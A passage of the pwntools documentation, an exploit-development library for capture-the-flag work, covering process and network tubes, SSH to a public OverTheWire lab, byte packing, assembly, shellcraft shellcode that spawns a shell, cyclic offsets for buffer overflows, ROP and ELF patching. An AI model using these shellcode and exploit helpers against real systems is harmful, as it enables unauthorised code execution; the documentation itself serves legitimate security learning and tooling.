<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">l</span><span class="o">.</span><span class="n">lport</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">c</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">c</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="go">&#39;hello&#39;</span>
</pre></div>
</div>
<p>Interacting with processes is easy thanks to <a class="reference internal" href="index.html#module-pwnlib.tubes.process" title="pwnlib.tubes.process"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.tubes.process</span></code></a>.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;sleep 3; echo hello world;&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
<span class="go">&#39;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
<span class="go">&#39;hello world\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
</div>
<p>Not only can you interact with processes programmatically, but you can
actually <strong>interact</strong> with processes.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span> 
<span class="go">$ whoami</span>
<span class="go">user</span>
</pre></div>
</div>
<p>There&#8217;s even an SSH module for when you&#8217;ve got to SSH into a box to perform
a local/setuid exploit with <a class="reference internal" href="index.html#module-pwnlib.tubes.ssh" title="pwnlib.tubes.ssh"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.tubes.ssh</span></code></a>.  You can quickly spawn
processes and grab the output, or spawn a process and interact with it like
a <code class="docutils literal"><span class="pre">process</span></code> tube.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">shell</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="s1">&#39;bandit0&#39;</span><span class="p">,</span> <span class="s1">&#39;bandit.labs.overthewire.org&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;bandit0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">2220</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">shell</span><span class="p">[</span><span class="s1">&#39;whoami&#39;</span><span class="p">]</span>
<span class="go">&#39;bandit0&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">shell</span><span class="o">.</span><span class="n">download_file</span><span class="p">(</span><span class="s1">&#39;/etc/motd&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh</span> <span class="o">=</span> <span class="n">shell</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;sleep 3; echo hello world;&#39;</span><span class="p">)</span> 
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
<span class="go">&#39;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
<span class="go">&#39;hello world\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">shell</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
</div>
</div>
<div class="section" id="packing-integers">
<h4>Packing Integers<a class="headerlink" href="#packing-integers" title="Permalink to this headline">¶</a></h4>
<p>A common task for exploit-writing is converting between integers as Python
sees them, and their representation as a sequence of bytes.
Usually folks resort to the built-in <code class="docutils literal"><span class="pre">struct</span></code> module.</p>
<p>pwntools makes this easier with <a class="reference internal" href="index.html#module-pwnlib.util.packing" title="pwnlib.util.packing"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.packing</span></code></a>.  No more remembering
unpacking codes, and littering your code with helper routines.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">struct</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">==</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">leet</span> <span class="o">=</span> <span class="s1">&#39;37130000&#39;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">u32</span><span class="p">(</span><span class="s1">&#39;abcd&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="s1">&#39;abcd&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
<span class="go">True</span>
</pre></div>
</div>
<p>The packing/unpacking operations are defined for many common bit-widths.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">u8</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x41</span>
<span class="go">True</span>
</pre></div>
</div>
</div>
<div class="section" id="setting-the-target-architecture-and-os">
<h4>Setting the Target Architecture and OS<a class="headerlink" href="#setting-the-target-architecture-and-os" title="Permalink to this headline">¶</a></h4>
<p>The target architecture can generally be specified as an argument to the routine that requires it.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;nop&#39;</span><span class="p">)</span>
<span class="go">&#39;\x90&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;nop&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;arm&#39;</span><span class="p">)</span>
<span class="go">&#39;\x00\xf0 \xe3&#39;</span>
</pre></div>
</div>
<p>However, it can also be set once in the global <code class="docutils literal"><span class="pre">context</span></code>.  The operating system, word size, and endianness can also be set here.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="s1">&#39;i386&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">os</span>        <span class="o">=</span> <span class="s1">&#39;linux&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">endian</span>    <span class="o">=</span> <span class="s1">&#39;little&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
</pre></div>
</div>
<p>Additionally, you can use a shorthand to set all of the values at once.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;nop&#39;</span><span class="p">)</span>
<span class="go">&#39;\x90&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;arm&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="n">word_size</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;nop&#39;</span><span class="p">)</span>
<span class="go">&#39;\xe3 \xf0\x00&#39;</span>
</pre></div>
</div>
</div>
<div class="section" id="setting-logging-verbosity">
<h4>Setting Logging Verbosity<a class="headerlink" href="#setting-logging-verbosity" title="Permalink to this headline">¶</a></h4>
<p>You can control the verbosity of the standard pwntools logging via <code class="docutils literal"><span class="pre">context</span></code>.</p>
<p>For example, setting</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</pre></div>
</div>
<p>Will cause all of the data sent and received by a <code class="docutils literal"><span class="pre">tube</span></code> to be printed to the screen.</p>
</div>
<div class="section" id="assembly-and-disassembly">
<h4>Assembly and Disassembly<a class="headerlink" href="#assembly-and-disassembly" title="Permalink to this headline">¶</a></h4>
<p>Never again will you need to run some already-assembled pile of shellcode
from the internet!  The <a class="reference internal" href="index.html#module-pwnlib.asm" title="pwnlib.asm"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.asm</span></code></a> module is full of awesome.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov eax, 0&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
<span class="go">&#39;b800000000&#39;</span>
</pre></div>
</div>
<p>But if you do, it&#8217;s easy to suss out!</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">disasm</span><span class="p">(</span><span class="s1">&#39;6a0258cd80ebf9&#39;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">))</span>
<span class="go">   0:   6a 02                   push   0x2</span>
<span class="go">   2:   58                      pop    eax</span>
<span class="go">   3:   cd 80                   int    0x80</span>
<span class="go">   5:   eb f9                   jmp    0x0</span>
</pre></div>
</div>
<p>However, you shouldn&#8217;t even need to write your own shellcode most of the
time!  pwntools comes with the <a class="reference internal" href="index.html#module-pwnlib.shellcraft" title="pwnlib.shellcraft"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft</span></code></a> module, which is
loaded with useful time-saving shellcodes.</p>
<p>Let&#8217;s say that we want to <cite>setreuid(getuid(), getuid())</cite> followed by <cite>dup`ing
file descriptor 4 to `stdin</cite>, <cite>stdout</cite>, and <cite>stderr</cite>, and then pop a shell!</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">setreuid</span><span class="p">()</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">dupsh</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span> 
<span class="go">&#39;6a3158cd80...&#39;</span>
</pre></div>
</div>
</div>
<div class="section" id="misc-tools">
<h4>Misc Tools<a class="headerlink" href="#misc-tools" title="Permalink to this headline">¶</a></h4>
<p>Never write another hexdump, thanks to <a class="reference internal" href="index.html#module-pwnlib.util.fiddling" title="pwnlib.util.fiddling"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.fiddling</span></code></a>.</p>
<p>Find offsets in your buffer that cause a crash, thanks to <code class="xref py py-mod docutils literal"><span class="pre">pwnlib.cyclic</span></code>.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
<span class="go">aaaabaaacaaadaaaeaaa</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># Assume EIP = 0x62616166 (&#39;faab&#39; which is pack(0x62616166))  at crash time</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="s1">&#39;faab&#39;</span><span class="p">)</span>
<span class="go">120</span>
</pre></div>
</div>
</div>
<div class="section" id="elf-manipulation">
<h4>ELF Manipulation<a class="headerlink" href="#elf-manipulation" title="Permalink to this headline">¶</a></h4>
<p>Stop hard-coding things!  Look them up at runtime with <a class="reference internal" href="index.html#module-pwnlib.elf" title="pwnlib.elf"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.elf</span></code></a>.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/bin/cat&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">address</span><span class="p">)</span> 
<span class="go">0x400000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">])</span> 
<span class="go">0x401680</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">])</span> 
<span class="go">0x60b070</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">])</span> 
<span class="go">0x401680</span>
</pre></div>
</div>
<p>You can even patch and save the files.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/bin/cat&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
<span class="go">&#39;\x7fELF&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="s1">&#39;ret&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s1">&#39;/tmp/quiet-cat&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">disasm</span><span class="p">(</span><span class="n">file</span><span class="p">(</span><span class="s1">&#39;/tmp/quiet-cat&#39;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
<span class="go">&#39;   0:   c3                      ret&#39;</span>
</pre></div>
</div>
</div>
</div>
<span id="document-globals"></span><div class="section" id="from-pwn-import">
<h3><code class="docutils literal"><span class="pre">from</span> <span class="pre">pwn</span> <span class="pre">import</span> <span class="pre">*</span></code><a class="headerlink" href="#from-pwn-import" title="Permalink to this headline">¶</a></h3>
<p>The most common way that you&#8217;ll see pwntools used is</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
</pre></div>
</div>
<p>Which imports a bazillion things into the global namespace to make your life easier.</p>
<p>This is a quick list of most of the objects and routines imported, in rough order of importance and frequency of use.</p>
<ul class="simple">
<li><dl class="first docutils">
<dt><a class="reference internal" href="index.html#module-pwnlib.context" title="pwnlib.context"><code class="xref py py-obj docutils literal"><span class="pre">context</span></code></a></dt>
<dd><ul class="first last">
<li><a class="reference internal" href="index.html#pwnlib.context.context" title="pwnlib.context.context"><code class="xref py py-data docutils literal"><span class="pre">pwnlib.context.context</span></code></a></li>
<li>Responsible for most of the pwntools convenience settings</li>
<li>Set <cite>context.log_level = &#8216;debug&#8217;</cite> when troubleshooting your exploit</li>
<li>Scope-aware, so you can disable logging for a subsection of code via <a class="reference internal" href="index.html#pwnlib.context.ContextType.local" title="pwnlib.context.ContextType.local"><code class="xref py py-meth docutils literal"><span class="pre">ContextType.local()</span></code></a></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal"><span class="pre">remote</span></code>, <code class="docutils literal"><span class="pre">listen</span></code>, <code class="docutils literal"><span class="pre">ssh</span></code>, <code class="docutils literal"><span class="pre">process</span></code></dt>
<dd><ul class="first last">
<li><a class="reference internal" href="index.html#module-pwnlib.tubes" title="pwnlib.tubes"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.tubes</span></code></a></li>
<li>Super convenient wrappers around all of the common functionality for CTF challenges</li>
<li>Connect to anything, anywhere, and it works the way you want it to</li>
<li>Helpers for common tasks like <code class="docutils literal"><span class="pre">recvline</span></code>, <code class="docutils literal"><span class="pre">recvuntil</span></code>, <code class="docutils literal"><span class="pre">clean</span></code>, etc.</li>
<li>Interact directly with the application via <code class="docutils literal"><span class="pre">.interactive()</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal"><span class="pre">p32</span></code> and <code class="docutils literal"><span class="pre">u32</span></code></dt>
<dd><ul class="first last">
<li><a class="reference internal" href="index.html#module-pwnlib.util.packing" title="pwnlib.util.packing"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.packing</span></code></a></li>
<li>Useful functions to make sure you never have to remember if <code class="docutils literal"><span class="pre">'&gt;'</span></code> means signed or unsigned for <code class="docutils literal"><span class="pre">struct.pack</span></code>, and no more ugly <code class="docutils literal"><span class="pre">[0]</span></code> index at the end.</li>
<li>Set <code class="docutils literal"><span class="pre">signed</span></code> and <code class="docutils literal"><span class="pre">endian</span></code> in sane manners (also these can be set once on <code class="docutils literal"><span class="pre">context</span></code> and not bothered with again)</li>
<li>Most common sizes are pre-defined (<code class="docutils literal"><span class="pre">u8</span></code>, <code class="docutils literal"><span class="pre">u64</span></code>, etc), and <a class="reference internal" href="index.html#pwnlib.util.packing.pack" title="pwnlib.util.packing.pack"><code class="xref py py-func docutils literal"><span class="pre">pwnlib.util.packing.pack()</span></code></a> lets you define your own.</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal"><span class="pre">log</span></code></dt>
<dd><ul class="first last">
<li><a class="reference internal" href="index.html#module-pwnlib.log" title="pwnlib.log"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.log</span></code></a></li>
<li>Make your output pretty!</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal"><span class="pre">cyclic</span></code> and <code class="docutils literal"><span class="pre">cyclic_func</span></code></dt>
<dd><ul class="first last">
<li><a class="reference internal" href="index.html#module-pwnlib.util.cyclic" title="pwnlib.util.cyclic"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.cyclic</span></code></a></li>
<li>Utilities for generating strings such that you can find the offset of any given substring given only N (usually 4) bytes.  This is super useful for straight buffer overflows.  Instead of looking at 0x41414141, you could know that 0x61616171 means you control EIP at offset 64 in your buffer.</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal"><span class="pre">asm</span></code> and <code class="docutils literal"><span class="pre">disasm</span></code></dt>
<dd><ul class="first last">
<li><a class="reference internal" href="index.html#module-pwnlib.asm" title="pwnlib.asm"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.asm</span></code></a></li>
<li>Quickly turn assembly into some bytes, or vice-versa, without mucking about</li>
<li>Supports any architecture for which you have a binutils installed</li>
<li>Over 20 different architectures have pre-built binaries at <a class="reference external" href="https://launchpad.net/~pwntools/+archive/ubuntu/binutils">ppa:pwntools/binutils</a>.</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal"><span class="pre">shellcraft</span></code></dt>
<dd><ul class="first last">
<li><a class="reference internal" href="index.html#module-pwnlib.shellcraft" title="pwnlib.shellcraft"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft</span></code></a></li>
<li>Library of shellcode ready to go</li>
<li><code class="docutils literal"><span class="pre">asm(shellcraft.sh())</span></code> gives you a shell</li>
<li>Templating library for reusability of shellcode fragments</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal"><span class="pre">ELF</span></code></dt>
<dd><ul class="first last">
<li><a class="reference internal" href="index.html#module-pwnlib.elf" title="pwnlib.elf"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.elf</span></code></a></li>
<li>ELF binary manipulation tools, including symbol lookup, virtual memory to file offset helpers, and the ability to modify and save binaries back to disk</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal"><span class="pre">DynELF</span></code></dt>
<dd><ul class="first last">
<li><a class="reference internal" href="index.html#module-pwnlib.dynelf" title="pwnlib.dynelf"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.dynelf</span></code></a></li>
<li>Dynamically resolve functions given only a pointer to any loaded module, and a function which can leak data at any address</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal"><span class="pre">ROP</span></code></dt>
<dd><ul class="first last">
<li><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.rop</span></code></li>
<li>Automatically generate ROP chains using a DSL to describe what you want to do, rather than raw addresses</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal"><span class="pre">gdb.debug</span></code> and <code class="docutils literal"><span class="pre">gdb.attach</span></code></dt>
<dd><ul class="first last">
<li><a class="reference internal" href="index.html#module-pwnlib.gdb" title="pwnlib.gdb"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.gdb</span></code></a></li>
<li>Launch a binary under GDB and pop up a new terminal to interact with it.  Automates setting breakpoints and makes iteration on exploits MUCH faster.</li>
<li>Alternately, attach to a running process given a PID, <a class="reference internal" href="index.html#module-pwnlib.tubes" title="pwnlib.tubes"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.tubes</span></code></a> object, or even just a socket that&#8217;s connected to it</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal"><span class="pre">args</span></code></dt>
<dd><ul class="first last">
<li>Dictionary containing all-caps command-line arguments for quick access</li>
<li>Run via <code class="docutils literal"><span class="pre">python</span> <span class="pre">foo.py</span> <span class="pre">REMOTE=1</span></code> and <code class="docutils literal"><span class="pre">args['REMOTE']</span> <span class="pre">==</span> <span class="pre">'1'</span></code>.</li>
<li><dl class="first docutils">
<dt>Can also control logging verbosity and terminal fanciness</dt>
<dd><ul class="first last">
<li><cite>NOTERM</cite></li>
<li><cite>SILENT</cite></li>
<li><cite>DEBUG</cite></li>
</ul>
</dd>
</dl>
</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal"><span class="pre">randoms</span></code>, <code class="docutils literal"><span class="pre">rol</span></code>, <code class="docutils literal"><span class="pre">ror</span></code>, <code class="docutils literal"><span class="pre">xor</span></code>, <code class="docutils literal"><span class="pre">bits</span></code></dt>
<dd><ul class="first last">
<li><a class="reference internal" href="index.html#module-pwnlib.util.fiddling" title="pwnlib.util.fiddling"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.fiddling</span></code></a></li>
<li>Useful utilities for generating random data from a given alphabet, or simplifying math operations that usually require masking off with <cite>0xffffffff</cite> or calling <cite>ord</cite> and <cite>chr</cite> an ugly number of times</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal"><span class="pre">net</span></code></dt>
<dd><ul class="first last">
<li><a class="reference internal" href="index.html#module-pwnlib.util.net" title="pwnlib.util.net"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.net</span></code></a></li>
<li>Routines for querying about network interfaces</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal"><span class="pre">proc</span></code></dt>
<dd><ul class="first last">
<li><a class="reference internal" href="index.html#module-pwnlib.util.proc" title="pwnlib.util.proc"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.proc</span></code></a></li>
<li>Routines for querying about processes</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal"><span class="pre">pause</span></code></dt>
<dd><ul class="first last">
<li>It&#8217;s the new <code class="docutils literal"><span class="pre">getch</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal"><span class="pre">safeeval</span></code></dt>
<dd><ul class="first last">
<li><a class="reference internal" href="index.html#module-pwnlib.util.safeeval" title="pwnlib.util.safeeval"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.safeeval</span></code></a></li>
<li>Functions for safely evaluating python code without nasty side-effects.</li>
</ul>
</dd>
</dl>
</li>
</ul>
<p>These are all pretty self explanatory, but are useful to have in the global namespace.</p>
<ul class="simple">
<li><code class="docutils literal"><span class="pre">hexdump</span></code></li>
<li><code class="docutils literal"><span class="pre">read</span></code> and <code class="docutils literal"><span class="pre">write</span></code></li>
<li><code class="docutils literal"><span class="pre">enhex</span></code> and <code class="docutils literal"><span class="pre">unhex</span></code></li>
<li><code class="docutils literal"><span class="pre">more</span></code></li>
<li><code class="docutils literal"><span class="pre">group</span></code></li>
<li><code class="docutils literal"><span class="pre">align</span></code> and <code class="docutils literal"><span class="pre">align_down</span></code></li>
<li><code class="docutils literal"><span class="pre">urlencode</span></code> and <code class="docutils literal"><span class="pre">urldecode</span></code></li>
<li><code class="docutils literal"><span class="pre">which</span></code></li>
<li><code class="docutils literal"><span class="pre">wget</span></code></li>
</ul>
<p>Additionally, all of the following modules are auto-imported for you.  You were going to do it anyway.</p>
<ul class="simple">
<li><code class="docutils literal"><span class="pre">os</span></code></li>
<li><code class="docutils literal"><span class="pre">sys</span></code></li>
<li><code class="docutils literal"><span class="pre">time</span></code></li>
<li><code class="docutils literal"><span class="pre">requests</span></code></li>
<li><code class="docutils literal"><span class="pre">re</span></code></li>
<li><code class="docutils literal"><span class="pre">random</span></code></li>
</ul>
</div>
<span id="document-commandline"></span><div class="section" id="command-line-tools">
<h3>Command Line Tools<a class="headerlink" href="#command-line-tools" title="Permalink to this headline">¶</a></h3>
<p>pwntools comes with a handful of useful command-line utilities which serve as wrappers for some of the internal functionality.</p>
<div class="toctree-wrapper compound">
</div>
<div class="section" id="pwn">
<h4>pwn<a class="headerlink" href="#pwn" title="Permalink to this headline">¶</a></h4>
<p>Pwntools Command-line Interface</p>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

<div class="section" id="pwn-asm">
<h5>pwn asm<a class="headerlink" href="#pwn-asm" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-asm-arg-line">
<code class="descname">line</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-asm-arg-line" title="Permalink to this definition">¶</a></dt>
<dd><p>Lines to assemble. If none are supplied, use stdin</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-asm-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-asm-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-asm-f">
